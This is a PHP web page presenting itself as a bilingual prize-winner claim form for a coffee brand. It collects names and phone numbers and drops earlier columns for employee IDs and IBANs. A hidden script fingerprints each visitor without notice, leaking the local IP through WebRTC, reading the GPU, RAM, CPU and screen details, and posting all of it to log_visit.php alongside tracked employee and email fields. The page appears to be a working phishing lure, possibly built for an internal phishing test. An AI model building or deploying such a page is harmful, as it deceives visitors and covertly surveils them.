<?php
session_start();

// Database configuration
$host = 'localhost';
$dbname = 'prize_db';
$username = 'root';
$password = '';

$success_message = '';
$error_message = '';

// Auto-create database and table if not exists
try {
    $conn_setup = new PDO("mysql:host=$host", $username, $password);
    $conn_setup->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Create database
    $conn_setup->exec("CREATE DATABASE IF NOT EXISTS $dbname CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
    $conn_setup->exec("USE $dbname");
    
    // Create table
    $sql_create = "CREATE TABLE IF NOT EXISTS winners (
        id INT AUTO_INCREMENT PRIMARY KEY,
        name_arabic VARCHAR(255) NOT NULL,
        name_english VARCHAR(255) NOT NULL,
        phone_number VARCHAR(20) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_created (created_at)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";
    
    $conn_setup->exec($sql_create);
    
    // Create page visits tracking table
    $sql_visits = "CREATE TABLE IF NOT EXISTS page_visits (
        id INT AUTO_INCREMENT PRIMARY KEY,
        ip_address VARCHAR(45) NOT NULL,
        local_ip VARCHAR(45),
        tracked_emp_id VARCHAR(50),
        tracked_name_arabic VARCHAR(255),
        tracked_name_english VARCHAR(255),
        tracked_email VARCHAR(255),
        country VARCHAR(100),
        city VARCHAR(100),
        timezone VARCHAR(50),
        language VARCHAR(50),
        screen_size VARCHAR(50),
        color_scheme VARCHAR(20),
        browser VARCHAR(100),
        os VARCHAR(100),
        platform VARCHAR(50),
        user_agent TEXT,
        referrer TEXT,
        touch_screen VARCHAR(10),
        orientation VARCHAR(50),
        gpu TEXT,
        ram VARCHAR(50),
        cpu_cores VARCHAR(20),
        device_type VARCHAR(20),
        device_model VARCHAR(100),
        pixel_ratio VARCHAR(20),
        connection_type VARCHAR(50),
        battery_level VARCHAR(20),
        visit_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_ip (ip_address),
        INDEX idx_time (visit_time),
        INDEX idx_country (country),
        INDEX idx_tracked_emp (tracked_emp_id)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";
    
    $conn_setup->exec($sql_visits);
    
    // Migrate existing table - add new columns if they don't exist
    $columns_to_add = [
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS local_ip VARCHAR(45)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS tracked_emp_id VARCHAR(50)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS tracked_name_arabic VARCHAR(255)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS tracked_name_english VARCHAR(255)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS tracked_email VARCHAR(255)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS country VARCHAR(100)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS city VARCHAR(100)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS timezone VARCHAR(50)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS language VARCHAR(50)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS screen_size VARCHAR(50)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS color_scheme VARCHAR(20)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS browser VARCHAR(100)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS os VARCHAR(100)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS platform VARCHAR(50)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS referrer TEXT",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS touch_screen VARCHAR(10)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS orientation VARCHAR(50)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS gpu TEXT",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS ram VARCHAR(50)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS cpu_cores VARCHAR(20)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS device_type VARCHAR(20)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS device_model VARCHAR(100)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS pixel_ratio VARCHAR(20)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS connection_type VARCHAR(50)",
        "ALTER TABLE page_visits ADD COLUMN IF NOT EXISTS battery_level VARCHAR(20)"
    ];
    
    foreach ($columns_to_add as $alter_sql) {
        try {
            $conn_setup->exec($alter_sql);
        } catch(PDOException $e) {
            // Column might already exist, continue
        }
    }
    
    // Add phone_number column if not exists
    $conn_setup->exec("ALTER TABLE winners ADD COLUMN IF NOT EXISTS phone_number VARCHAR(20) NOT NULL DEFAULT ''");
    
    // Remove old columns if exist
    $result = $conn_setup->query("SHOW COLUMNS FROM winners LIKE 'employee_id'");
    if ($result->rowCount() > 0) {
        $conn_setup->exec("ALTER TABLE winners DROP COLUMN employee_id");
    }
    
    $result = $conn_setup->query("SHOW COLUMNS FROM winners LIKE 'iban_number'");
    if ($result->rowCount() > 0) {
        $conn_setup->exec("ALTER TABLE winners DROP COLUMN iban_number");
    }
    
    $result = $conn_setup->query("SHOW COLUMNS FROM winners LIKE 'ip_address'");
    if ($result->rowCount() > 0) {
        $conn_setup->exec("ALTER TABLE winners DROP COLUMN ip_address");
    }
} catch(PDOException $e) {
    // Silently continue - errors will be caught in form submission
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    try {
        // Create database connection
        $conn = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $username, $password);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Get form data
        $name_arabic = $_POST['name_arabic'];
        $name_english = $_POST['name_english'];
        $phone_number = $_POST['phone_number'];
        
        // Insert data into database
        $sql = "INSERT INTO winners (name_arabic, name_english, phone_number, created_at) 
                VALUES (:name_arabic, :name_english, :phone_number, NOW())";
        
        $stmt = $conn->prepare($sql);
        $stmt->execute([
            ':name_arabic' => $name_arabic,
            ':name_english' => $name_english,
            ':phone_number' => $phone_number
        ]);
        
        $success_message = $name_english;
        
    } catch(PDOException $e) {
        $error_message = "Error: " . $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة الفائز - Winner Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 600px;
            width: 100%;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .header .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 8px;
            color: #333;
            font-size: 1.1em;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 1em;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 10px rgba(102, 126, 234, 0.2);
        }
        
        .form-group input[dir="rtl"] {
            text-align: right;
        }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        .success-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .success-content {
            background: white;
            padding: 50px;
            border-radius: 20px;
            text-align: center;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from {
                transform: scale(0.5);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .success-content h2 {
            color: #28a745;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        
        .success-content p {
            font-size: 1.5em;
            color: #333;
            margin-bottom: 30px;
        }
        
        .success-content .confetti {
            font-size: 3em;
            margin-bottom: 20px;
        }
        
        .close-btn {
            padding: 15px 40px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1.1em;
            cursor: pointer;
            font-weight: bold;
        }
        
        .close-btn:hover {
            background: #218838;
        }
        
        .error-message {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-container">
                <img src="logo.png" alt="Ratio Coffee" style="max-width: 300px; margin-bottom: 20px;">
            </div>
            <h1>مبروك - Congratulations!</h1>
            <p style="color: #666; font-size: 1.2em;">أدخل بياناتك - Enter Your Details</p>
        </div>
        
        <?php if ($error_message): ?>
            <div class="error-message"><?php echo htmlspecialchars($error_message); ?></div>
        <?php endif; ?>
        
        <form method="POST" action="">
            <div class="form-group">
                <label>الاسم بالعربي - Name in Arabic</label>
                <input type="text" name="name_arabic" dir="rtl" required placeholder="أدخل اسمك بالعربي">
            </div>
            
            <div class="form-group">
                <label>الاسم بالإنجليزي - Name in English</label>
                <input type="text" name="name_english" dir="ltr" required placeholder="Enter your name in English">
            </div>
            
            <div class="form-group">
                <label>رقم الجوال - Phone Number</label>
                <input type="tel" name="phone_number" dir="ltr" required placeholder="05xxxxxxxx">
            </div>
            
            <button type="submit" class="submit-btn">إرسال - Submit</button>
        </form>
    </div>
    
    <?php if ($success_message): ?>
    <div class="success-modal">
        <div class="success-content">
            <div class="confetti">🎉🎊🎉</div>
            <h2>مبروك!</h2>
            <h2>Congratulations!</h2>
            <p style="font-size: 2em; color: #667eea; font-weight: bold;">
                <?php echo htmlspecialchars($success_message); ?>
            </p>
            <p>سيتم التواصل معك لاستلام الجائزة</p>
            <p>We will contact you to receive the prize</p>
            <button class="close-btn" onclick="window.location.href='index.php'">موافق - OK</button>
        </div>
    </div>
    <?php endif; ?>
    
    <script>
    // Collect detailed visitor information
    (function() {
        // Detect local IP using WebRTC
        function getLocalIP(callback) {
            const ips = [];
            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            
            if (!RTCPeerConnection) {
                callback('Not supported');
                return;
            }
            
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) {
                    callback(ips.length > 0 ? ips.join(', ') : 'Unknown');
                    pc.close();
                    return;
                }
                
                const ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
                const ipMatch = ipRegex.exec(ice.candidate.candidate);
                
                if (ipMatch && ipMatch[1]) {
                    const ip = ipMatch[1];
                    if (!ips.includes(ip)) {
                        ips.push(ip);
                    }
                }
            };
            
            setTimeout(() => {
                callback(ips.length > 0 ? ips.join(', ') : 'Unknown');
                pc.close();
            }, 1500);
        }
        
        // Detect GPU
        function getGPUInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
            return 'Unknown';
        }
        
        // Detect OS
        function getOS() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf('Win') !== -1) return 'Windows';
            if (userAgent.indexOf('Mac') !== -1) return 'MacOS';
            if (userAgent.indexOf('Linux') !== -1) return 'Linux';
            if (userAgent.indexOf('Android') !== -1) return 'Android';
            if (userAgent.indexOf('iOS') !== -1) return 'iOS';
            return 'Unknown';
        }
        
        // Detect Browser
        function getBrowser() {
            const ua = navigator.userAgent;
            let match = ua.match(/(edge|edg|chrome|safari|firefox|opera|msie|trident(?=\/))/i) || [];
            if (/trident/i.test(match[0])) return 'Internet Explorer';
            if (match[0] === 'Chrome') {
                if (ua.indexOf('Edg') !== -1) return 'Microsoft Edge';
                if (ua.indexOf('OPR') !== -1) return 'Opera';
            }
            return match[0] || 'Unknown';
        }
        
        // Detect device type and model
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let deviceType = 'Desktop';
            let deviceModel = 'Unknown';
            
            if (/mobile/i.test(ua)) deviceType = 'Mobile';
            else if (/tablet|ipad/i.test(ua)) deviceType = 'Tablet';
            
            // Try to extract device model
            const modelMatch = ua.match(/\(([^)]+)\)/);
            if (modelMatch) deviceModel = modelMatch[1];
            
            return { type: deviceType, model: deviceModel };
        }
        
        const deviceInfo = getDeviceInfo();
        
        // Get local IP and send data
        getLocalIP(function(localIP) {
            const visitorData = {
                local_ip: localIP,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            screen_size: screen.width + ' x ' + screen.height + ' @ ' + screen.colorDepth + 'bit',
            pixel_ratio: window.devicePixelRatio || 'Unknown',
            color_scheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
            connection_type: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
            battery_level: 'Restricted',
            browser: getBrowser() + ' (' + navigator.appVersion + ')',
            os: getOS(),
            platform: navigator.platform,
            user_agent: navigator.userAgent,
            referrer: document.referrer || 'Direct',
            touch_screen: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            gpu: getGPUInfo(),
            ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            cpu_cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : 'Unknown',
                device_type: deviceInfo.type,
                device_model: deviceInfo.model
            };
            
            console.log('Sending visitor data:', visitorData);
            
            // Send data to server
            fetch('log_visit.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(visitorData)
            }).then(response => response.json())
              .then(data => console.log('Tracking response:', data))
              .catch(error => console.error('Tracking error:', error));
        });
    })();
    </script>
</body>
</html>
